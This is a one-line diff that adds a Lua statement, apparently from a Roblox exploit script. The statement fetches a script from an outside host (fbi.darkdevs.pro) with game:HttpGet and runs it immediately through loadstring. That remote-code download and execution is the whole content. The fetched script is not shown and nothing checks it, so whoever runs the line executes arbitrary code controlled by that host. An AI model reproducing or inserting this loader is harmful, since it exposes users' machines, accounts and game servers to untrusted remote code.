@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('http://fbi.darkdevs.pro/fun/bizarre.lua-378c2a1dcd59492d92198dac14e37b8d.lua',true))()
